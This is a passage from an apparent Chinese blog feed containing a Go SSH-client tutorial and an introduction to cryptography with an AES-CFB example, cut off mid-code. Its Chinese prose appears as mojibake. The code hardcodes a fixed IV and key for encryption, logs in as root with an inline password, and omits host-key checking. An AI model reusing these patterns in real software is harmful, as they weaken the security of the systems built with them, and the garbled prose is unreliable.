ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; termFD := int(os.Stdin.Fd()) w, h, _ := terminal.GetSize(termFD) termState, _ := terminal.MakeRaw(termFD) defer terminal.Restore(termFD, termState) err = session.RequestPty("xterm-256color", h, w, modes) ce(err, "request pty") err = session.Shell() ce(err, "start shell") err = session.Wait() ce(err, "return")&#125; è¿œç¨‹å‘½ä»¤æ¨¡å¼123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport ( "bytes" "fmt" "log" "golang.org/x/crypto/ssh")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; err = session.RequestPty("xterm-256color", 80, 40, modes) ce(err, "request pty") if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; var b bytes.Buffer session.Stdout, session.Stderr = &amp;b, &amp;b if err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; fmt.Println(b.String())&#125; ç®€ä»‹SSH(Secure Shell)æ˜¯ä¸€ä¸ªæä¾›æ•°æ®é€šä¿¡å®‰å…¨ã€è¿œç¨‹ç™»å½•ã€è¿œç¨‹æŒ‡ä»¤æ‰§è¡Œç­‰åŠŸèƒ½çš„å®‰å…¨ç½‘ç»œåè®®, å…·ä½“å¯ä»¥æŸ¥é˜…æˆ‘çš„ä¸Šä¸€ç¯‡åšå®¢è·³æ¿æœºç³»åˆ—(äºŒ)-sshåè®®åŸç†ç®€ä»‹ä½†æ˜¯golangçš„sshåŒ…å¹¶ä¸åœ¨golangçš„æ ‡å‡†åº“ä¸­, åœ¨: godoc.org/golang.org/x/crypto/sshä¸­, æ‰€ä»¥éœ€è¦ç¿»å¢™æ‰èƒ½ä¸‹åˆ°ã€‚golangçš„è¿™ä¸ªsshåŒ…åŒæ—¶å®ç°äº†sshçš„å®¢æˆ·ç«¯å’Œserverç«¯, ä¹Ÿè®¸ä½ ä¹Ÿç»å¸¸çœ‹åˆ°ä¸€ä¸ªssh-agentçš„ä¸œè¥¿, ä¹Ÿåœ¨è¿™ä¸ªåŒ…æ‹¬, ä½†æˆ‘ä¸å°†ä»–å½’çº³åœ¨clientå’Œserveré‡Œé¢, å› ä¸ºssh-agentæ˜¯ä¸€ä¸ªç”¨äºä¿å­˜ç§é’¥çš„ç¨‹åº, åœ¨æ•°å­—ç­¾åéªŒè¯æ—¶(RSA, DSA, ECDSA, Ed25519)æä¾›èº«ä»½è®¤è¯, å®ƒå°±æ˜¯ä¸€ä¸ªå¸®åŠ©æˆ‘ä»¬éªŒè¯èº«ä»½çš„ç¨‹åºã€‚æ¥ä¸‹æ¥ä¸»è¦è®²ssh clent, ä½†æ˜¯è¿˜æ˜¯ä¼šæ¶‰åŠåˆ°ä¸€ç‚¹ssh-agentçš„éƒ¨åˆ†ã€‚ è®¤è¯è¦ä½¿ç”¨sshçš„å®¢æˆ·ç«¯, é‚£ä¹ˆè®¤è¯å°±æ¯”è¾ƒå…³é”®äº†, sshæä¾›2ç§è®¤è¯æ–¹å¼: ç”¨æˆ·åå¯†ç è®¤è¯å’Œå¯†é’¥è®¤è¯ã€‚é€šè¿‡sshæä¾›çš„ä¸€ä¸ªconfigå¯¹è±¡, æˆ‘ä»¬å¯ä»¥é…ç½®sshä½¿ç”¨çš„è®¤è¯æ–¹å¼. è€Œé…ç½®å¯¹è±¡é‡Œé¢å…³äºè®¤è¯çš„é…ç½®ä½¿ç”¨çš„æ˜¯ssh.AuthMethodæ¥å£, ssh.AuthMethodæ˜¯authçš„æ€»æ¥å£(å­˜å‚¨å®ç°äº†auth å’Œ methodçš„å¯¹è±¡), AuthMethodå‘ˆç°çš„æ˜¯ä¸€ä¸ªå®ç°äº†RFC4252è®¤è¯æ–¹æ³•çš„å®ä¾‹ã€‚ ç”¨æˆ·åå¯†ç è®¤è¯è®¤è¯æ–¹å¼å¦‚æœä½¿ç”¨Passwordæ–¹å¼çš„è¯ é‚£ä¹ˆå¯ä»¥ä½¿ç”¨ssh.Passwordæ–¹æ³•è·å–ä¸€ä¸ªAuthMethodæ¥å£å¯¹è±¡ã€‚123456sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; ssh.Password("your_password") &#125;,&#125; å¯†é’¥è®¤è¯å‰æ: å¯†é’¥è®¤è¯çš„æœ¬è´¨æ˜¯ä½¿ç”¨éå¯¹ç§°åŠ å¯†çš„æ•°å­—ç­¾ååŠŸèƒ½, æ‰€ä»¥å¿…é¡»å°†ä½ çš„å…¬å…±å¯†é’¥å¡«å……åˆ°ä¸€ä¸ªè¿œç¨‹æœºå™¨ä¸Šçš„authorized_keysæ–‡ä»¶ä¸­ ä½ å¯ä»¥æ‰‹åŠ¨å®Œæˆ, ä¹Ÿå¯ä»¥ä½¿ç”¨ssh-copy-idè¿™ä¸ªå‘½ä»¤æ¥å¸®ä½ å®Œæˆã€‚åœ¨å…¬é’¥æ¨é€okè¿‡å, ä½¿ç”¨ç§˜é’¥è®¤è¯, è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼å¯ä»¥è·å–ç”¨æˆ·çš„ç§é’¥, ç”¨äºç­¾åç®—æ³•æ—¶åšèº«ä»½è®¤è¯: ä»ç§˜é’¥æ–‡ä»¶ä¸­è¯»å–å’Œssh-agentä¸­è¯»å–ã€‚ ç§é’¥æ–‡ä»¶è¯»å–ç§é’¥æ–‡ä»¶, ç„¶åä½¿ç”¨ssh.PublicKeysæ–¹æ³• è·å–ä¸€ä¸ªAuthMethodæ¥å£å¯¹è±¡, è¿™é‡Œæˆ‘å†æ¬¡å°è£…äº†ä¸‹, é€šè¿‡PublicKeyFileå¯ä»¥ç›´æ¥è·å–ä¸€ä¸ªå…¬é’¥çš„AuthMethodæ¥å£ã€‚12345678910111213141516171819func PublicKeyFile(file string) ssh.AuthMethod &#123; buffer, err := ioutil.ReadFile(file) if err != nil &#123; return nil &#125; key, err := ssh.ParsePrivateKey(buffer) if err != nil &#123; return nil &#125; return ssh.PublicKeys(key)&#125;sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; PublicKeyFile("/path/to/your/pub/certificate/key") &#125;,&#125; SSH AgentSSH Agent æ˜¯ä¸€ä¸ª*nixç³»ç»Ÿé‡Œé¢çš„å·¥å…·, ä»–å°†ç”¨æˆ·ç§é’¥ä¿å­˜åœ¨ä¸€å¼ åŠ å¯†çš„è¡¨ä¸­, ä¸ºäº†é¿å…å‘½ä»¤è¡Œçš„å‚æ•°ä¼ å…¥, å¾ˆå¤šç”¨æˆ·è¿˜æ˜¯æ„¿æ„å°†ä»–ä»¬çš„ç§˜é’¥äº¤ç»™ssh agentç®¡ç†ã€‚ä¸ºäº†èƒ½è·å–åˆ°ä½ å­˜å‚¨åœ¨ssh agentä¸­çš„ç§é’¥, ä½ é¦–å…ˆçš„å°†ä½ çš„ç§é’¥æäº¤ç»™ssh agentä¿ç®¡,æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤:1$ ssh-add /path/to/your/private/certificate/file æˆ‘ä»¬å¯ä»¥é€šè¿‡socket(net.Dial)è®¿é—®åˆ°é‡Œé¢å­˜å‚¨çš„ç§é’¥, ç„¶åä½¿ç”¨å·¥å‚å‡½æ•°ssh.PublicKeysCallbackæ¥åˆ›å»ºä¸€ä¸ªssh agentçš„AuthMethodå®ä¾‹ã€‚12345678910111213func SSHAgent() ssh.AuthMethod &#123; if sshAgent, err := net.Dial("unix", os.Getenv("SSH_AUTH_SOCK")); err == nil &#123; return ssh.PublicKeysCallback(agent.NewClient(sshAgent).Signers) &#125; return nil&#125;sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; SSHAgent() &#125;,&#125; å»ºç«‹é“¾æ¥å½“æˆ‘ä»¬é€šè¿‡ssh.ClientConfigå¯¹è±¡è®¾ç½®å¥½sshçš„é…ç½®è¿‡å, æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ssh.Dialæ–¹æ³•æ¥å»ºç«‹ä¸€ä¸ªsshè¿æ¥äº†1234connection, err := ssh.Dial("tcp", "host:port", sshConfig)if err != nil &#123; return nil, fmt.Errorf("Failed to dial: %s", err)&#125; åˆ›å»ºå›è¯ä¸äº¤æ¢å½“sshè¿æ¥å»ºç«‹è¿‡å, æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªè¿æ¥å»ºç«‹ä¸€ä¸ªå›è¯, åœ¨å›è¯ä¸Šå’Œè¿œç¨‹ä¸»æœºé€šä¿¡ã€‚1234session, err := connection.NewSession()if err != nil &#123; return nil, fmt.Errorf("Failed to create session: %s", err)&#125; ä½†æ˜¯é€šä¿¡ä¹‹å‰æˆ‘ä»¬éœ€è¦è¯·æ±‚åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªä¼ªç»ˆç«¯(ptyå…¨ç§°pseudo terminal), ç®€å•è¯´æ¥ptyæ˜¯ä¸€å¯¹å­—ç¬¦è®¾å¤‡, æä¾›ä¸€ä¸ªåŒå‘æ²Ÿé€šçš„æ¸ é“ï¼Œå¤§æ¦‚è¿‡ç¨‹æ˜¯è¿™æ ·(pty master &lt;â€”sessionâ€”&gt; pty slave), å…³äºå¯¹ptyçš„æ›´è¯¦å°½çš„ä»‹ç»å¯ä»¥å‚è€ƒTTYçš„é‚£äº›äº‹å„¿12345678910modes := ssh.TerminalModes&#123; ssh.ECHO: 0, // disable echoing ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud&#125;if err := session.RequestPty("xterm", 80, 40, modes); err != nil &#123; session.Close() return nil, fmt.Errorf("request for pseudo terminal failed: %s", err)&#125; è¿œç¨‹ä¸»æœºå¼€å¯ptyç»ˆç«¯è¿‡å, æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥é€šè¿‡Runå‘é€å‘½ä»¤äº†, è¿™é‡Œæˆ‘ä»¬é€šè¿‡Setenvè®¾ç½®sessionçš„ç¯å¢ƒå˜é‡, sessionæ‰§è¡Œçš„ç»“æœé€šè¿‡Stdout, Stderrè¿”å›, è¿™é‡Œä½¿ç”¨ä¸€ä¸ªBufferæ¥ä¿å­˜è¿™äº›ç»“æœã€‚123456789if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error())&#125;var b bytes.Buffersession.Stdout, session.Stderr = &amp;b, &amp;bif err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error())&#125; å¦‚æœæˆ‘ä»¬ä½¿ç”¨Shellæ¨¡å¼çš„è¯, æˆ‘ä»¬éœ€è¦åœ¨ptmxä¸Šåˆ›å»ºä¸€ä¸ªterminal, è¿™æ ·å¯¹ä»–çš„æ“ä½œæ‰ä¼šååº”åˆ°ptsä¸Š ,å¤§æ¦‚çš„åŸç†æ˜¯è¿™æ ·: ssh&lt;---&gt;/dev/ptmx(master)&lt;---&gt;pts/*(slave)&lt;---&gt;gettyä¸ºäº†è¯´æ¸…æ¥šåŸç†, æˆ‘å¼•ç”¨äº†åˆ«äººçš„è¯,å¸Œæœ›èƒ½æ–¹ä¾¿ä½ ç†è§£: å¦‚æœæŸäººåœ¨ç½‘ä¸Šä½¿ç”¨telnetç¨‹åºè¿æ¥åˆ°ä½ çš„è®¡ç®—æœºä¸Šï¼Œåˆ™telnetç¨‹åºå°±å¯èƒ½ä¼šæ‰“å¼€/dev/ptmxè®¾å¤‡è·å–ä¸€ä¸ªfdã€‚æ­¤æ—¶ä¸€ä¸ªgettyç¨‹åºå°±åº”è¯¥è¿è¡Œåœ¨å¯¹åº”çš„/dev/pts/ä¸Šã€‚å½“telnetä»è¿œç«¯è·å–äº†ä¸€ä¸ªå­—ç¬¦æ—¶ï¼Œè¯¥å­—ç¬¦å°±ä¼šé€šè¿‡ptmxã€pts/ä¼ é€’ç»™ gettyç¨‹åºï¼Œè€Œgettyç¨‹åºå°±ä¼šé€šè¿‡pts/*ã€ptmxå’Œtelnetç¨‹åºå¾€ç½‘ç»œä¸Šè¿”å›â€œlogin:â€å­—ç¬¦ä¸²ä¿¡æ¯ã€‚è¿™æ ·ï¼Œç™»å½•ç¨‹åºä¸telnetç¨‹åºå°±é€šè¿‡ä¼ªç»ˆç«¯è¿›è¡Œé€šä¿¡ã€‚ 123456789101112131415161718session.Stdout = os.Stdoutsession.Stderr = os.Stderrsession.Stdin = os.Stdinmodes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400,&#125;termFD := int(os.Stdin.Fd())w, h, _ := terminal.GetSize(termFD)termState, _ := terminal.MakeRaw(termFD)defer terminal.Restore(termFD, termState)err = session.RequestPty("xterm-256color", h, w, modes)ce(err, "request pty") æ€»ç»“å…¶å®TTYæ˜¯ä¸€ä¸ªå¾ˆå¤§å¾ˆç»å…¸çš„è¯é¢˜, åé¢åšWeb Terminalæ—¶, è¿˜å¾—ä½¿ç”¨xtermè¿™ç§ç±»å‹çš„pty, ç”±äºç¯‡å¹…æœ‰é™, æ²¡æœ‰å±•å¼€, ä»¥åè¡¥ä¸Šã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¯†ç å­¦ç®€ä»‹ä¸Golangçš„åŠ å¯†åº“Cryptoçš„ä½¿ç”¨]]></title>
    <url>%2F2017%2F02%2F19%2Fgo-crypto%2F</url>
    <content type="text"><![CDATA[æ®è®°è½½ï¼Œå…¬å…ƒå‰400å¹´ï¼Œå¤å¸Œè…Šäººå‘æ˜äº†ç½®æ¢å¯†ç ã€‚1881å¹´ä¸–ç•Œä¸Šçš„ç¬¬ä¸€ä¸ªç”µè¯ä¿å¯†ä¸“åˆ©å‡ºç°ã€‚åœ¨ç¬¬äºŒæ¬¡ä¸–ç•Œå¤§æˆ˜æœŸé—´ï¼Œå¾·å›½å†›æ–¹å¯ç”¨â€œæ©å°¼æ ¼ç›â€å¯†ç æœºï¼Œå¯†ç å­¦åœ¨æˆ˜äº‰ä¸­èµ·ç€éå¸¸é‡è¦çš„ä½œç”¨, è¿™æ®µå†å²å¾ˆæœ‰è¶£,å»ºè®®çœ‹çœ‹æ©æ ¼ç›æœºç ´è§£å†å²ã€‚éšç€ä¿¡æ¯åŒ–å’Œæ•°å­—åŒ–ç¤¾ä¼šçš„å‘å±•ï¼Œäººä»¬å¯¹ä¿¡æ¯å®‰å…¨å’Œä¿å¯†çš„é‡è¦æ€§è®¤è¯†ä¸æ–­æé«˜ï¼Œäºæ˜¯åœ¨1997å¹´ï¼Œç¾å›½å›½å®¶æ ‡å‡†å±€å…¬å¸ƒå®æ–½äº†â€œç¾å›½æ•°æ®åŠ å¯†æ ‡å‡†ï¼ˆDESï¼‰â€ï¼Œæ°‘é—´åŠ›é‡å¼€å§‹å…¨é¢ä»‹å…¥å¯†ç å­¦çš„ç ”ç©¶å’Œåº”ç”¨ä¸­ï¼Œé‡‡ç”¨çš„åŠ å¯†ç®—æ³•æœ‰DESã€RSAã€SHAç­‰ã€‚éšç€å¯¹åŠ å¯†å¼ºåº¦éœ€æ±‚çš„ä¸æ–­æé«˜ï¼Œè¿‘æœŸåˆå‡ºç°äº†AESã€ECCç­‰ã€‚ å¯†ç å­¦çš„ç›®çš„ ä¿å¯†æ€§ï¼šé˜²æ­¢ç”¨æˆ·çš„æ ‡è¯†æˆ–æ•°æ®è¢«è¯»å–ã€‚ æ•°æ®å®Œæ•´æ€§ï¼šé˜²æ­¢æ•°æ®è¢«æ›´æ”¹ã€‚ èº«ä»½éªŒè¯ï¼šç¡®ä¿æ•°æ®å‘è‡ªç‰¹å®šçš„ä¸€æ–¹ã€‚ å¯†ç å­¦çš„åº”ç”¨éšç€å¯†ç å­¦å•†ä¸šåº”ç”¨çš„æ™®åŠï¼Œå…¬é’¥å¯†ç å­¦å—åˆ°å‰æ‰€æœªæœ‰çš„é‡è§†ã€‚é™¤ä¼ ç»Ÿçš„å¯†ç åº”ç”¨ç³»ç»Ÿå¤–ï¼ŒPKIç³»ç»Ÿä»¥å…¬é’¥å¯†ç æŠ€æœ¯ä¸ºä¸»ï¼Œæä¾›åŠ å¯†ã€ç­¾åã€è®¤è¯ã€å¯†é’¥ç®¡ç†ã€åˆ†é…ç­‰åŠŸèƒ½ã€‚ ä¿å¯†é€šä¿¡ï¼šä¿å¯†é€šä¿¡æ˜¯å¯†ç å­¦äº§ç”Ÿçš„åŠ¨å› ã€‚ä½¿ç”¨å…¬ç§é’¥å¯†ç ä½“åˆ¶è¿›è¡Œä¿å¯†é€šä¿¡æ—¶ï¼Œä¿¡æ¯æ¥æ”¶è€…åªæœ‰çŸ¥é“å¯¹åº”çš„å¯†é’¥æ‰å¯ä»¥è§£å¯†è¯¥ä¿¡æ¯ã€‚ æ•°å­—ç­¾åï¼šæ•°å­—ç­¾åæŠ€æœ¯å¯ä»¥ä»£æ›¿ä¼ ç»Ÿçš„æ‰‹å†™ç­¾åï¼Œè€Œä¸”ä»å®‰å…¨çš„è§’åº¦è€ƒè™‘ï¼Œæ•°å­—ç­¾åå…·æœ‰å¾ˆå¥½çš„é˜²ä¼ªé€ åŠŸèƒ½ã€‚åœ¨æ”¿åºœæœºå…³ã€å†›äº‹é¢†åŸŸã€å•†ä¸šé¢†åŸŸæœ‰å¹¿æ³›çš„åº”ç”¨ç¯å¢ƒã€‚ ç§˜å¯†å…±äº«ï¼šç§˜å¯†å…±äº«æŠ€æœ¯æ˜¯æŒ‡å°†ä¸€ä¸ªç§˜å¯†ä¿¡æ¯åˆ©ç”¨å¯†ç æŠ€æœ¯åˆ†æ‹†æˆnä¸ªç§°ä¸ºå…±äº«å› å­çš„ä¿¡æ¯ï¼Œåˆ†å‘ç»™nä¸ªæˆå‘˜ï¼Œåªæœ‰k(kâ‰¤n)ä¸ªåˆæ³•æˆå‘˜çš„å…±äº«å› å­æ‰å¯ä»¥æ¢å¤è¯¥ç§˜å¯†ä¿¡æ¯ï¼Œå…¶ä¸­ä»»ä½•ä¸€ä¸ªæˆ–m(mâ‰¤k)ä¸ªæˆå‘˜åˆä½œéƒ½ä¸çŸ¥é“è¯¥ç§˜å¯†ä¿¡æ¯ã€‚åˆ©ç”¨ç§˜å¯†å…±äº«æŠ€æœ¯å¯ä»¥æ§åˆ¶ä»»ä½•éœ€è¦å¤šä¸ªäººå…±åŒæ§åˆ¶çš„ç§˜å¯†ä¿¡æ¯ã€å‘½ä»¤ç­‰ã€‚ è®¤è¯åŠŸèƒ½ï¼šåœ¨å…¬å¼€çš„ä¿¡é“ä¸Šè¿›è¡Œæ•æ„Ÿä¿¡æ¯çš„ä¼ è¾“ï¼Œé‡‡ç”¨ç­¾åæŠ€æœ¯å®ç°å¯¹æ¶ˆæ¯çš„çœŸå®æ€§ã€å®Œæ•´æ€§è¿›è¡ŒéªŒè¯ï¼Œé€šè¿‡éªŒè¯å…¬é’¥è¯ä¹¦å®ç°å¯¹é€šä¿¡ä¸»ä½“çš„èº«ä»½éªŒè¯ã€‚ å¯†é’¥ç®¡ç†ï¼šå¯†é’¥æ˜¯ä¿å¯†ç³»ç»Ÿä¸­æ›´ä¸ºè„†å¼±è€Œé‡è¦çš„ç¯èŠ‚ï¼Œå…¬é’¥å¯†ç ä½“åˆ¶æ˜¯è§£å†³å¯†é’¥ç®¡ç†å·¥ä½œçš„æœ‰åŠ›å·¥å…·ï¼›åˆ©ç”¨å…¬é’¥å¯†ç ä½“åˆ¶è¿›è¡Œå¯†é’¥åå•†å’Œäº§ç”Ÿï¼Œä¿å¯†é€šä¿¡åŒæ–¹ä¸éœ€è¦äº‹å…ˆå…±äº«ç§˜å¯†ä¿¡æ¯ï¼›åˆ©ç”¨å…¬é’¥å¯†ç ä½“åˆ¶è¿›è¡Œå¯†é’¥åˆ†å‘ã€ä¿æŠ¤ã€å¯†é’¥æ‰˜ç®¡ã€å¯†é’¥æ¢å¤ç­‰ã€‚ åŠ å¯†ç®—æ³•ä»‹ç»æ ¹æ®å¯†é’¥ç±»å‹ä¸åŒå°†ç°ä»£å¯†ç æŠ€æœ¯åˆ†ä¸ºä¸¤ç±»ï¼š å¯¹ç§°åŠ å¯†ç®—æ³•: åŠ å¯†å’Œè§£å¯†å‡é‡‡ç”¨åŒä¸€æŠŠç§˜å¯†é’¥åŒ™ã€‚ éå¯¹ç§°åŠ å¯†ç®—æ³•: æœ‰2æŠŠå¯†é’¥,å…¬é’¥å’Œç§é’¥, å…¬é’¥åŠ å¯†, ç§é’¥è§£å¯†ã€‚ å¯¹ç§°åŠ å¯†ç®—æ³•å¯¹ç§°åŠ å¯†ç®—æ³•ç”¨æ¥å¯¹æ•æ„Ÿæ•°æ®ç­‰ä¿¡æ¯è¿›è¡ŒåŠ å¯†ï¼Œå¸¸ç”¨çš„ç®—æ³•åŒ…æ‹¬ï¼š DES(Data Encryption Standard): æ•°æ®åŠ å¯†æ ‡å‡†ï¼Œé€Ÿåº¦è¾ƒå¿«ï¼Œé€‚ç”¨äºåŠ å¯†å¤§é‡æ•°æ®çš„åœºåˆã€‚ 3DES(Triple DES): æ˜¯åŸºäºDESï¼Œå¯¹ä¸€å—æ•°æ®ç”¨ä¸‰ä¸ªä¸åŒçš„å¯†é’¥è¿›è¡Œä¸‰æ¬¡åŠ å¯†ï¼Œå¼ºåº¦æ›´é«˜ã€‚ AES(Advanced Encryption Standard): é«˜çº§åŠ å¯†æ ‡å‡†ï¼Œæ˜¯ä¸‹ä¸€ä»£çš„åŠ å¯†ç®—æ³•æ ‡å‡†ï¼Œé€Ÿåº¦å¿«ï¼Œå®‰å…¨çº§åˆ«é«˜ï¼› AES2000å¹´10æœˆï¼ŒNIST(ç¾å›½å›½å®¶æ ‡å‡†å’ŒæŠ€æœ¯åä¼š)å®£å¸ƒé€šè¿‡ä»15ç§ä¾¯é€‰ç®—æ³•ä¸­é€‰å‡ºçš„ä¸€é¡¹æ–°çš„å¯†åŒ™åŠ å¯†æ ‡å‡†ã€‚Rijndaelè¢«é€‰ä¸­æˆä¸ºå°†æ¥çš„AESã€‚ Rijndaelæ˜¯åœ¨1999å¹´ä¸‹åŠå¹´ï¼Œç”±ç ”ç©¶å‘˜Joan Daemenå’ŒVincent Rijmenåˆ›å»ºçš„ã€‚AESæ­£æ—¥ç›Šæˆä¸ºåŠ å¯†å„ç§å½¢å¼çš„ç”µå­æ•°æ®çš„å®é™…æ ‡å‡†ã€‚å¹¶äº2002å¹´5æœˆ26æ—¥åˆ¶å®šäº†æ–°çš„é«˜çº§åŠ å¯†æ ‡å‡† (AES) è§„èŒƒã€‚ç®—æ³•åŸç† AESç®—æ³•åŸºäºæ’åˆ—å’Œç½®æ¢è¿ç®—ã€‚æ’åˆ—æ˜¯å¯¹æ•°æ®é‡æ–°è¿›è¡Œå®‰æ’ï¼Œç½®æ¢æ˜¯å°†ä¸€ä¸ªæ•°æ®å•å…ƒæ›¿æ¢ä¸ºå¦ä¸€ä¸ªã€‚AES ä½¿ç”¨å‡ ç§ä¸åŒçš„æ–¹æ³•æ¥æ‰§è¡Œæ’åˆ—å’Œç½®æ¢è¿ç®—ã€‚AESæ˜¯ä¸€ä¸ªè¿­ä»£çš„ã€å¯¹ç§°å¯†é’¥åˆ†ç»„çš„å¯†ç ï¼Œå®ƒå¯ä»¥ä½¿ç”¨128ã€192 å’Œ 256 ä½å¯†é’¥ï¼Œå¹¶ä¸”ç”¨ 128 ä½ï¼ˆ16å­—èŠ‚ï¼‰åˆ†ç»„åŠ å¯†å’Œè§£å¯†æ•°æ®ã€‚ä¸å…¬å…±å¯†é’¥å¯†ç ä½¿ç”¨å¯†é’¥å¯¹ä¸åŒï¼Œå¯¹ç§°å¯†é’¥å¯†ç ä½¿ç”¨ç›¸åŒçš„å¯†é’¥åŠ å¯†å’Œè§£å¯†æ•°æ®ã€‚é€šè¿‡åˆ†ç»„å¯†ç è¿”å›çš„åŠ å¯†æ•°æ®çš„ä½æ•°ä¸è¾“å…¥æ•°æ®ç›¸åŒã€‚è¿­ä»£åŠ å¯†ä½¿ç”¨ä¸€ä¸ªå¾ªç¯ç»“æ„ï¼Œåœ¨è¯¥å¾ªç¯ä¸­é‡å¤ç½®æ¢å’Œæ›¿æ¢è¾“å…¥æ•°æ®ã€‚ DESDESå…¨ç§°ä¸ºData Encryption Standardï¼Œå³æ•°æ®åŠ å¯†æ ‡å‡†ï¼Œæ˜¯ä¸€ç§ä½¿ç”¨å¯†é’¥åŠ å¯†çš„å—ç®—æ³•ï¼Œ1977å¹´è¢«ç¾å›½è”é‚¦æ”¿åºœçš„å›½å®¶æ ‡å‡†å±€ç¡®å®šä¸ºè”é‚¦èµ„æ–™å¤„ç†æ ‡å‡†ï¼ˆFIPSï¼‰ï¼Œå¹¶æˆæƒåœ¨éå¯†çº§æ”¿åºœé€šä¿¡ä¸­ä½¿ç”¨ï¼Œéšåè¯¥ç®—æ³•åœ¨å›½é™…ä¸Šå¹¿æ³›æµä¼ å¼€æ¥ã€‚ AESä¸3DESçš„æ¯”è¾ƒ ç®—æ³•åç§° ç®—æ³•ç±»å‹ å¯†é’¥é•¿åº¦ é€Ÿåº¦ è§£å¯†æ—¶é—´ï¼ˆå»ºè®¾æœºå™¨æ¯ç§’å°è¯•255ä¸ªå¯†é’¥ï¼‰ èµ„æºæ¶ˆè€— AES å¯¹ç§°blockå¯†ç  128ã€192ã€256ä½ é«˜ 1490000äº¿å¹´ ä½ 3DES å¯¹ç§°feistelå¯†ç  112ä½æˆ–168ä½ ä½ 46äº¿å¹´ ä¸­ ç ´è§£å†å²å†å²ä¸Šæœ‰ä¸‰æ¬¡å¯¹DESæœ‰å½±å“çš„æ”»å‡»å®éªŒã€‚1997å¹´ï¼Œåˆ©ç”¨å½“æ—¶å„å›½ 7ä¸‡å°è®¡ç®—æœºï¼Œå†æ—¶96å¤©ç ´è§£äº†DESçš„å¯†é’¥ã€‚1998å¹´ï¼Œç”µå­è¾¹å¢ƒåŸºé‡‘ä¼šï¼ˆEFFï¼‰ç”¨25ä¸‡ç¾å…ƒåˆ¶é€ çš„ä¸“ç”¨è®¡ç®—æœºï¼Œç”¨56å°æ—¶ç ´è§£äº†DESçš„å¯†é’¥ã€‚1999å¹´ï¼ŒEFFç”¨22å°æ—¶15åˆ†å®Œæˆäº†ç ´è§£å·¥ä½œã€‚å› æ­¤ã€‚æ›¾ç»æœ‰è¿‡å“è¶Šè´¡çŒ®çš„DESä¹Ÿä¸èƒ½æ»¡è¶³æˆ‘ä»¬æ—¥ç›Šå¢é•¿çš„éœ€æ±‚äº†ã€‚ ä»£ç ç¤ºä¾‹ç»¼ä¸Šçœ‹æ¥AESå®‰å…¨åº¦æœ€é«˜, åŸºæœ¬ç°çŠ¶å°±æ˜¯AESå·²ç»æ›¿ä»£DESæˆä¸ºæ–°ä¸€ä»£å¯¹ç§°åŠ å¯†çš„æ ‡å‡†, ä¸‹é¢æ˜¯Golangä¸­AESä½¿ç”¨çš„æ —å­12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package mainimport ( "crypto/aes" "crypto/cipher" "fmt")var commonIV = []byte&#123;0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f&#125;func encrypt(plainText string, keyText string) (cipherByte []byte, err error) &#123; // è½¬æ¢æˆå­—èŠ‚æ•°æ®, æ–¹ä¾¿åŠ å¯† plainByte := []byte(plainText) keyByte := []byte(keyText) // åˆ›å»ºåŠ å¯†ç®—æ³•aes c, err := aes.NewCipher(keyByte) if err != nil &#123; return nil, err &#125; //åŠ å¯†å­—ç¬¦ä¸² cfb := cipher.NewCFBEncrypter(c, commonIV) cipherByte = make([]byte, len(plainByte)) cfb.XORKeyStream(cipherByte, plainByte) return&#125;func decrypt(cipherByte []byte, keyText string) (plainText string, err error) &#123; // è½¬æ¢æˆå­—èŠ‚æ•°æ®, æ–¹ä¾¿åŠ å¯† keyByte := []byte(keyText) // åˆ›å»ºåŠ å¯†ç®—æ³•aes c, err := aes.NewCipher(keyByte) if err != nil &#123; return "", err &#125; // è§£å¯†å­—ç¬¦ä¸² cfbdec := cipher.NewCFBDecrypter(c, commonIV) plainByte := make([]byte, len(cipherByte)) cfbdec.XORKeyStream(plainByte, cipherByte) plainText = string(plainByte) return&#125;func main() &#123; plain := "The text need to be encrypt." // AES è§„å®šæœ‰3ç§é•¿åº¦çš„key: 16, 24, 32åˆ†åˆ«å¯¹åº”AES-128, AES-192, or AES-256 key := "abcdefgehjhijkmlkjjwwoew" // åŠ å¯† cipherByte, err := encrypt(plain, key) if err != nil &#123; fmt.Println(err) &#125; fmt.Printf("%s ==&gt; %x\n", plain, cipherByte) // è§£å¯† plainText, err := decrypt(cipherByte, key) if err != nil &#123; fmt.Println(err) &#125; fmt.Printf("%x ==&gt; %s\n", cipherByte, 